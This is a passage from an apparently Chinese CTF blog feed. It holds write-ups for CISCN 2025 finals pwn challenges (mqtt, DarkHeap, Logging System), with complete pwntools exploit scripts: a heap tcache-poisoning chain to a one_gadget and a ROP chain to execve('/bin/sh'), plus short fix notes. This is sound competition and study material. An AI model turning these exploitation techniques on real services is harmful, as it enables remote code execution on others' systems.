class="number">11</span>)</span><br><span class="line">vm(<span class="number">5</span>, <span class="number">3</span> + (<span class="number">2</span> &lt;&lt; <span class="number">2</span>), <span class="number">1</span>, p8_ex(<span class="number">3</span>)) <span class="comment"># fake_IO + 0x368 --&gt; reg3</span></span><br><span class="line">vm(<span class="number">11</span>)</span><br><span class="line">vm(<span class="number">11</span>)</span><br><span class="line"></span><br><span class="line">vm(<span class="number">5</span>, <span class="number">2</span> + (<span class="number">1</span> &lt;&lt; <span class="number">2</span>), <span class="number">1</span>, p64_ex(<span class="number">0</span>))</span><br><span class="line">vm(<span class="number">11</span>)</span><br><span class="line">vm(<span class="number">11</span>)</span><br><span class="line">vm(<span class="number">5</span>, <span class="number">3</span> + (<span class="number">1</span> &lt;&lt; <span class="number">2</span>), <span class="number">1</span>, <span class="string">b&#x27;  sh;\x00\x00\x00&#x27;</span>) <span class="comment"># fake_IO + 0x368 --&gt; reg3</span></span><br><span class="line">vm(<span class="number">11</span>)</span><br><span class="line">vm(<span class="number">11</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># launch_gdb(cmd)</span></span><br><span class="line">sa(<span class="string">b&#x27;plz input your vm-code&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">ia()</span><br></pre></td></tr></table></figure></div>

]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>ciscn</tag>
      </tags>
  </entry>
  <entry>
    <title>ciscn-2025-决赛</title>
    <url>/202507/23/ciscn-2025-%E5%86%B3%E8%B5%9B/</url>
    <content><![CDATA[<h1 id="Ciscn-2025-决赛-PWN"><a href="#Ciscn-2025-决赛-PWN" class="headerlink" title="Ciscn 2025 决赛 PWN"></a>Ciscn 2025 决赛 PWN</h1><h2 id="Day-1"><a href="#Day-1" class="headerlink" title="Day 1"></a>Day 1</h2><h3 id="mqtt"><a href="#mqtt" class="headerlink" title="mqtt"></a>mqtt</h3><h4 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h4><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/202507/23/ciscn-2025-%E5%86%B3%E8%B5%9B/image-20250723132403510.png"
                      class="" title="image-20250723132403510"
                >

<p>存在命令注入，但是需要绕过必须为字母数字的check</p>
<p>注意到程序有<code>sleep(2)</code>而且为多线程，因此这里是条件竞争</p>
<p>先输入合法vin，再进行命令注入</p>
<h4 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h4><p>使用mqttx订阅<code>diag</code>，得到<code>VIN</code>，计算得到<code>auth</code></p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> a1[] = <span class="string">&quot;111111111a&quot;</span>;</span><br><span class="line">    <span class="type">int</span> v3 = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; a1[i]; ++i)</span><br><span class="line">        v3 = <span class="number">31</span> * v3 + *(<span class="type">char</span>*)(i + a1);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%08x\n&quot;</span>, v3);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>然后发送</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/202507/23/ciscn-2025-%E5%86%B3%E8%B5%9B/image-20250719113706904.png"
                      class="" title="image-20250719113706904"
                >

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/202507/23/ciscn-2025-%E5%86%B3%E8%B5%9B/image-20250719113455689.png"
                      class="" title="image-20250719113455689"
                >

<h2 id="Day-2"><a href="#Day-2" class="headerlink" title="Day 2"></a>Day 2</h2><h3 id="DarkHeap"><a href="#DarkHeap" class="headerlink" title="DarkHeap"></a>DarkHeap</h3><h4 id="解法1"><a href="#解法1" class="headerlink" title="解法1"></a>解法1</h4><p>无泄漏UAF</p>
<p>以下exp来自Tplus师傅🥰(tqllll)</p>
<p>源码</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"> <span class="comment">/* While we&#x27;re here, if we see other chunks of the same size,</span></span><br><span class="line"><span class="comment">    stash them in the tcache.  */</span></span><br><span class="line"> <span class="type">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class="line"> <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">   &#123;</span><br><span class="line">     mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">     <span class="comment">/* While bin not empty and tcache not full, copy chunks over.  */</span></span><br><span class="line">     <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line">     &amp;&amp; (tc_victim = last (bin)) != bin)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (tc_victim != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      bck = tc_victim-&gt;bk;</span><br><span class="line">      set_inuse_bit_at_offset (tc_victim, nb);</span><br><span class="line">      <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">	set_non_main_arena (tc_victim);</span><br><span class="line">      bin-&gt;bk = bck;  <span class="comment">// 这里会将地址写入</span></span><br><span class="line">      bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">      tcache_put (tc_victim, tc_idx);</span><br><span class="line">           &#125;</span><br><span class="line">&#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></div>



<p>首先</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">7</span>, <span class="number">0x108</span>)</span><br><span class="line">add(<span class="number">8</span>, <span class="number">0x118</span>)</span><br></pre></td></tr></table></figure></div>

<p>在tcache_struct留下标志位</p>
<p>然后分配0x88大小chunk，填满tcache和smallbin</p>
<p>修改smallbins第七个chunk的bk位，使其指向tcache_struct的0x100链表位置</p>
<p>再申请8个0x88大小的chunk，触发smallbin reverse into tcache</p>
<p>这样，tcache_struct的0x100链表位置就会链入0x90的tcache链表</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/202507/23/ciscn-2025-%E5%86%B3%E8%B5%9B/image-20250723135122192.png"
                      class="" title="image-20250723135122192"
                >



<p>如法炮制，这次修改smallbins第八个chunk的bk位，使其指向tcache_struct的0x120链表位置</p>
<p>再申请8个0x88大小的chunk，触发smallbin reverse into tcache</p>
<p>这样，libc地址就会写入tcache_struct的0x120链表位置</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/202507/23/ciscn-2025-%E5%86%B3%E8%B5%9B/image-20250723135256329.png"
                      class="" title="image-20250723135256329"
                >

<p>接着就是申请0x88，修改0x120的低位，指向libc got，改为one gadget，触发报错</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/202507/23/ciscn-2025-%E5%86%B3%E8%B5%9B/image-20250723135407773.png"
                      class="" title="image-20250723135407773"
                >



<p><strong>无爆破版！！！！</strong></p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwncli <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;splitw&quot;</span>, <span class="string">&quot;-h&quot;</span>, <span class="string">&quot;-l&quot;</span>, <span class="string">&quot;130&quot;</span>]</span><br><span class="line">local_flag = sys.argv[<span class="number">1</span>] <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) == <span class="number">2</span> <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">cmd = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    set follow-fork child</span></span><br><span class="line"><span class="string">    brva 0x1483</span></span><br><span class="line"><span class="string">    brva 0x15A6</span></span><br><span class="line"><span class="string">    brva 0x154F</span></span><br><span class="line"><span class="string">    brva 0x165A</span></span><br><span class="line"><span class="string">    b malloc.c:3932</span></span><br><span class="line"><span class="string">    set $heap = $rebase(0x40A0)</span></span><br><span class="line"><span class="string">    dir /mnt/f/Documents/CTF/glibc/glibc-2.35</span></span><br><span class="line"><span class="string">    c</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">gift.elf = ELF(elf_path := <span class="string">&#x27;./DarkHeap_patch&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> local_flag == <span class="string">&quot;remote&quot;</span>:</span><br><span class="line">    addr = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    ip, port = re.split(<span class="string">r&#x27;[\s:]+&#x27;</span>, addr)</span><br><span class="line">    gift.io = remote(ip, port)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    gift.io = process(elf_path)</span><br><span class="line">    <span class="comment"># gift.io = gdb.debug(elf_path, gdbscript=cmd, sysroot=&#x27;/&#x27;)</span></span><br><span class="line">gift.remote = local_flag <span class="keyword">in</span> (<span class="string">&quot;remote&quot;</span>, <span class="string">&quot;nodbg&quot;</span>)</span><br><span class="line">init_x64_context(gift.io, gift)</span><br><span class="line">libc = load_libc()</span><br><span class="line"></span><br><span class="line">IAT = <span class="string">b&#x27;Choice:&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx, size</span>):</span><br><span class="line">    sla(IAT, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Index&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    sla(<span class="string">b&#x27;Size&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dele</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(IAT, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Index&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, data</span>):</span><br><span class="line">    sla(IAT, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;Index&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    sa(<span class="string">b&#x27;Content&#x27;</span>, data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># launch_gdb(cmd)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">7</span>, <span class="number">0x108</span>)</span><br><span class="line">add(<span class="number">8</span>, <span class="number">0x118</span>)</span><br><span class="line">heap_base = get_current_heapbase_addr()</span><br><span class="line">libc_base = get_current_libcbase_addr()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(i, <span class="number">0x88</span>)</span><br><span class="line">dele(<span class="number">7</span>)</span><br><span class="line">dele(<span class="number">8</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>, <span class="number">15</span>):</span><br><span class="line">    add(i, <span class="number">0x88</span>)</span><br><span class="line">    add(<span class="number">0xF</span>, <span class="number">0x10</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">15</span>):</span><br><span class="line">    dele(i)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x4F8</span>)</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0xB8</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x500</span> - <span class="number">0xC0</span> - <span class="number">8</span>)</span><br><span class="line">edit(</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    flat(</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="number">0xB8</span>: <span class="number">0x91</span>,</span><br><span class="line">            <span class="number">0xB8</span> + <span class="number">0x90</span>: <span class="number">0x91</span>,</span><br><span class="line">            <span class="number">0xB8</span> + <span class="number">0x90</span> * <span class="number">2</span>: <span class="number">0x91</span>,</span><br><span class="line">        &#125;,</span><br><span class="line">        filler=<span class="string">b&#x27;\x00&#x27;</span>,</span><br><span class="line">    ),</span><br><span class="line">)</span><br><span class="line">dele(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0xF</span>, <span class="number">0x1500</span>)  <span class="comment"># put last unsorted into small</span></span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x1500</span>)  <span class="comment"># align</span></span><br><span class="line">dele(<span class="number">0xF</span>)</span><br><span class="line">edit(<span class="number">0xD</span>, p64(<span class="number">0</span>) + p16((heap_base &amp; <span class="number">0xFFFF</span>) + <span class="number">0x90</span> + <span class="number">8</span> * (<span class="number">0x100</span> - <span class="number">0x20</span>) // <span class="number">16</span> - <span class="number">0x10</span>))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    add(i, <span class="number">0x88</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(i, <span class="number">0x98</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>, <span class="number">15</span>):</span><br><span class="line">    add(i, <span class="number">0x98</span>)</span><br><span class="line">    add(<span class="number">0xF</span>, <span class="number">0x10</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">15</span>):</span><br><span class="line">    dele(i)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x4F8</span>)</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0xB8</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x500</span> - <span class="number">0xC0</span> - <span class="number">8</span>)</span><br><span class="line">edit(</span><br><span class="line">    <span class="number">0</span>,</span><br><span class="line">    flat(</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="number">0xB8</span>: <span class="number">0xA1</span>,</span><br><span class="line">            <span class="number">0xB8</span> + <span class="number">0xA0</span>: <span class="number">0xA1</span>,</span><br><span class="line">            <span class="number">0xB8</span> + <span class="number">0xA0</span> * <span class="number">2</span>: <span class="number">0xA1</span>,</span><br><span class="line">        &#125;,</span><br><span class="line">        filler=<span class="string">b&#x27;\x00&#x27;</span>,</span><br><span class="line">    ),</span><br><span class="line">)</span><br><span class="line">dele(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0xF</span>, <span class="number">0x128</span>)  <span class="comment"># put last unsorted into small</span></span><br><span class="line">edit(<span class="number">0xE</span>, p64(<span class="number">0</span>) + p16((heap_base &amp; <span class="number">0xFFFF</span>) + <span class="number">0x90</span> + <span class="number">8</span> * (<span class="number">0x120</span> - <span class="number">0x20</span>) // <span class="number">16</span> - <span class="number">0x10</span>))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    add(i, <span class="number">0x98</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x88</span>)</span><br><span class="line"><span class="comment"># edit(0, p64(0) * 2 + p32(libc.sym._IO_2_1_stdout_ &amp; 0xFFFF))</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>, p64(<span class="number">0</span>) * <span class="number">2</span> + p32((libc_base + <span class="number">0x21A080</span>) &amp; <span class="number">0xFFFFFFFF</span>)[:<span class="number">3</span>])</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x118</span>)</span><br><span class="line">edit(<span class="number">1</span>, p64(<span class="number">0</span>) * <span class="number">3</span> + p32((libc_base + get_current_one_gadget_from_libc()[<span class="number">4</span>]) &amp; <span class="number">0xFFFFFFFF</span>)[:<span class="number">3</span>])</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0xB8</span>)</span><br><span class="line">dele(<span class="number">2</span>)</span><br><span class="line">dele(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">ia()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>



<h4 id="解法2"><a href="#解法2" class="headerlink" title="解法2"></a>解法2</h4><p>以下解法来自中大的师傅</p>
<p>由于程序是fork的，因此地址不会改变，可以采用逐位爆破</p>
<p>具体做法就是先申请，然后free到unsortbin，从地位开始改unsortbin里存的libc地址，如果改对了，程序不会爆错，改错了就会</p>
<p>重复即可爆破出完整libc地址</p>
<h4 id="Fix"><a href="#Fix" class="headerlink" title="Fix"></a>Fix</h4><p>把free后的chunk fd位清空即可</p>
<p>听说call exit也能过</p>
<p>（nop free也能利用成功也是神人了，逆天check脚本）</p>
<h3 id="Logging-System"><a href="#Logging-System" class="headerlink" title="Logging System"></a>Logging System</h3><p>拿到的是依托，先恢复一下符号</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/202507/23/ciscn-2025-%E5%86%B3%E8%B5%9B/image-20250723140050539.png"
                      class="" title="image-20250723140050539"
                >

<p>程序先cin读入一个string</p>
<p>然后将string转成sstream，逐个字节读入数据</p>
<p>需要注意的是，程序要求输入base64</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/202507/23/ciscn-2025-%E5%86%B3%E8%B5%9B/image-20250723140203000.png"
                      class="" title="image-20250723140203000"
                >

<p>这里是base64decode</p>
<p>校验1，首位必须是0xB9</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/202507/23/ciscn-2025-%E5%86%B3%E8%B5%9B/image-20250723140233979.png"
                      class="" title="image-20250723140233979"
                >

<p>接着读入标志位</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/202507/23/ciscn-2025-%E5%86%B3%E8%B5%9B/image-20250723140253615.png"
                      class="" title="image-20250723140253615"
                >

<p>标志位有0x80 0x81 0x82 0x83，这些标志位代表下一次读入是读入多少字节的数据</p>
<p>0x80 - 1</p>
<p>0x81 - 2</p>
<p>0x82 - 4</p>
<p>0x83 - 8</p>
<p>接着又是一个校验位，0xBD<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/202507/23/ciscn-2025-%E5%86%B3%E8%B5%9B/image-20250723140439147.png"
                      class="" title="image-20250723140439147"
                ></p>
<p>和上面一样，也是先读标志位，然后读入数据</p>
<p>不同的是，这里读入数据是作为下一次读入的数据长度，如图<code>v76</code></p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/202507/23/ciscn-2025-%E5%86%B3%E8%B5%9B/image-20250723140553808.png"
                      class="" title="image-20250723140553808"
                >

<p>同样的，下面重复一次<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/202507/23/ciscn-2025-%E5%86%B3%E8%B5%9B/image-20250723140627319.png"
                      class="" title="image-20250723140627319"
                ></p>
<p>最后读入校验码，同样是先读入标志位</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/202507/23/ciscn-2025-%E5%86%B3%E8%B5%9B/image-20250723140737683.png"
                      class="" title="image-20250723140737683"
                >



<p>紧接着程序计算CRC校验值，需要我们最后一次读入的校验值和程序计算的一致</p>
<p>不需要自己计算，打断点动调即可获得校验值</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/202507/23/ciscn-2025-%E5%86%B3%E8%B5%9B/image-20250723140903275.png"
                      class="" title="image-20250723140903275"
                >



<p>紧接着程序执行<code>memcpy</code>，这里存在栈溢出</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/202507/23/ciscn-2025-%E5%86%B3%E8%B5%9B/image-20250723140928210.png"
                      class="" title="image-20250723140928210"
                >



<h4 id="Break"><a href="#Break" class="headerlink" title="Break"></a>Break</h4><p>简单的ROP，用ropper自动生成的</p>
<p>需要注意的是，程序在最后会调用sstream的析构函数，需要满足里面的一些条件判断，让程序不走到free，不然会崩溃</p>
<p>动调一下修改就行</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/202507/23/ciscn-2025-%E5%86%B3%E8%B5%9B/image-20250723141106463.png"
                      class="" title="image-20250723141106463"
                >

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/202507/23/ciscn-2025-%E5%86%B3%E8%B5%9B/image-20250723141125722.png"
                      class="" title="image-20250723141125722"
                >

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/202507/23/ciscn-2025-%E5%86%B3%E8%B5%9B/image-20250723141137277.png"
                      class="" title="image-20250723141137277"
                >

<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwncli <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;splitw&quot;</span>, <span class="string">&quot;-h&quot;</span>, <span class="string">&quot;-l&quot;</span>, <span class="string">&quot;130&quot;</span>]</span><br><span class="line">local_flag = sys.argv[<span class="number">1</span>] <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) == <span class="number">2</span> <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">cmd = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    b *0x405D15</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    b *0x405D50</span></span><br><span class="line"><span class="string">    b *0x405D9A</span></span><br><span class="line"><span class="string">    ida</span></span><br><span class="line"><span class="string">    c</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">gift.elf = ELF(elf_path := <span class="string">&#x27;./LoginSystem&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> local_flag == <span class="string">&quot;remote&quot;</span>:</span><br><span class="line">    addr = <span class="string">&#x27;39.96.183.124 20603&#x27;</span></span><br><span class="line">    ip, port = re.split(<span class="string">r&#x27;[\s:]+&#x27;</span>, addr)</span><br><span class="line">    gift.io = remote(ip, port)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    gift.io = process(elf_path)</span><br><span class="line">    <span class="comment"># gift.io = gdb.debug(elf_path, gdbscript=cmd, sysroot=&#x27;/&#x27;)</span></span><br><span class="line">gift.remote = local_flag <span class="keyword">in</span> (<span class="string">&quot;remote&quot;</span>, <span class="string">&quot;nodbg&quot;</span>)</span><br><span class="line">init_x64_context(gift.io, gift)</span><br><span class="line">libc = load_libc()</span><br><span class="line">launch_gdb(cmd)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">b&#x27;--&gt; &#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = p64</span><br><span class="line">IMAGE_BASE_0 = <span class="number">0x0000000000400000</span>  <span class="comment"># efa234332e5336c9d85b244c515b43af2c82417ea32f1f70f25663d3dfd566e3</span></span><br><span class="line">rebase_0 = <span class="keyword">lambda</span> x: p64(x + IMAGE_BASE_0)</span><br><span class="line"></span><br><span class="line">rop = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">rop += rebase_0(<span class="number">0x00000000000071B8</span>)  <span class="comment"># 0x00000000004071b8: pop r13; ret;</span></span><br><span class="line">rop += <span class="string">b&#x27;//bin/sh&#x27;</span></span><br><span class="line">rop += rebase_0(<span class="number">0x0000000000007150</span>)  <span class="comment"># 0x0000000000407150: pop rbx; ret;</span></span><br><span class="line">rop += rebase_0(<span class="number">0x000000000053E160</span>)</span><br><span class="line">rop += rebase_0(<span class="number">0x00000000003C2B42</span>)  <span class="comment"># 0x00000000007c2b42: mov qword ptr [rbx], r13; pop rbx; pop rbp; pop r12; pop r13; ret;</span></span><br><span class="line">rop += p(<span class="number">0xDEADBEEFDEADBEEF</span>)</span><br><span class="line">rop += p(<span class="number">0xDEADBEEFDEADBEEF</span>)</span><br><span class="line">rop += p(<span class="number">0xDEADBEEFDEADBEEF</span>)</span><br><span class="line">rop += p(<span class="number">0xDEADBEEFDEADBEEF</span>)</span><br><span class="line">rop += rebase_0(<span class="number">0x00000000000071B8</span>)  <span class="comment"># 0x00000000004071b8: pop r13; ret;</span></span><br><span class="line">rop += p(<span class="number">0x0000000000000000</span>)</span><br><span class="line">rop += rebase_0(<span class="number">0x0000000000007150</span>)  <span class="comment"># 0x0000000000407150: pop rbx; ret;</span></span><br><span class="line">rop += rebase_0(<span class="number">0x000000000053E168</span>)</span><br><span class="line">rop += rebase_0(<span class="number">0x00000000003C2B42</span>)  <span class="comment"># 0x00000000007c2b42: mov qword ptr [rbx], r13; pop rbx; pop rbp; pop r12; pop r13; ret;</span></span><br><span class="line">rop += p(<span class="number">0xDEADBEEFDEADBEEF</span>)</span><br><span class="line">rop += p(<span class="number">0xDEADBEEFDEADBEEF</span>)</span><br><span class="line">rop += p(<span class="number">0xDEADBEEFDEADBEEF</span>)</span><br><span class="line">rop += p(<span class="number">0xDEADBEEFDEADBEEF</span>)</span><br><span class="line">rop += rebase_0(<span class="number">0x0000000000005D99</span>)  <span class="comment"># 0x0000000000405d99: pop rdi; ret;</span></span><br><span class="line">rop += rebase_0(<span class="number">0x000000000053E160</span>)</span><br><span class="line">rop += rebase_0(<span class="number">0x00000000000079C4</span>)  <span class="comment"># 0x00000000004079c4: pop rsi; ret;</span></span><br><span class="line">rop += rebase_0(<span class="number">0x000000000053E168</span>)</span><br><span class="line">rop += rebase_0(<span class="number">0x0000000000128753</span>)  <span class="comment"># 0x0000000000528753: pop rdx; ret;</span></span><br><span class="line">rop += rebase_0(<span class="number">0x000000000053E168</span>)</span><br><span class="line">rop += rebase_0(<span class="number">0x0000000000009387</span>)  <span class="comment"># 0x0000000000409387: pop rax; ret;</span></span><br><span class="line">rop += p(<span class="number">0x000000000000003B</span>)</span><br><span class="line">rop += rebase_0(<span class="number">0x000000000030C546</span>)  <span class="comment"># 0x000000000070c546: syscall; ret;</span></span><br><span class="line"></span><br><span class="line">pay1 = flat(</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="number">0x150</span>: <span class="number">0x947FC0</span>,  <span class="comment"># 修改以不走free的分支</span></span><br><span class="line">        <span class="number">0x250</span>: <span class="number">0x947FC0</span>,  <span class="comment"># 修改以不走free的分支</span></span><br><span class="line">        <span class="number">0x7C8</span>: rop,</span><br><span class="line">    &#125;,</span><br><span class="line">    filler=<span class="string">b&#x27;\x00&#x27;</span>,</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;\xb9&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;\x80\x03&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;\xbd&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;\x80\x05&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;admin&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;\xbd&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;\x81&#x27;</span> + p16_ex(<span class="built_in">len</span>(pay1))</span><br><span class="line">payload += pay1</span><br><span class="line">payload += <span class="string">b&#x27;\x82&#x27;</span> + p64(<span class="number">0x633F1F27</span>)</span><br><span class="line"></span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sl(b64encode(payload))</span><br><span class="line"></span><br><span class="line">ia()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>



<h4 id="Fix-1"><a href="#Fix-1" class="headerlink" title="Fix"></a>Fix</h4><p>将<code>memcpy</code>的len改成256即可</p>
<h3 id="embbed-httpd"><a href="#embbed-httpd" class="headerlink" title="embbed_httpd"></a>embbed_httpd</h3><h4 id="Fix-2"><a href="#Fix-2" class="headerlink" title="Fix"></a>Fix</h4><p>晚点补……</p>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>ciscn</tag>
      </tags>
  </entry>
  <entry>
    <title>abstract_shellcode</title>
    <url>/202311/30/abstract-shellcode/</url>
    <content><![CDATA[<h2 id="abstract-shellcode"><a href="#abstract-shellcode" class="headerlink" title="abstract_shellcode"></a>abstract_shellcode</h2><p>checksec一下</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">   RELRO:    Full RELRO</span><br><span class="line">   Stack:    Canary found</span><br><span class="line">   NX:       NX unknown - GNU_STACK missing</span><br><span class="line">   PIE:      PIE enabled</span><br><span class="line">   Stack:    Executable</span><br><span class="line">   RWX:      Has RWX segments</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>IDA一下</p>
<p>main函数要求我们输入两个字符，如果是”ye”就退出</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/202311/30/abstract-shellcode/2023-11-30_19-07-06-17013449452931.png"
                      alt="2023-11-30_19-07-06"
                ></p>
<p>进func看看，大概分为两个部分</p>
<p>第一部分是一个循环，每次输入一字节，跳出条件为 (s-buf)&gt;16，即输入<em>17</em>个字符（划重点）</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
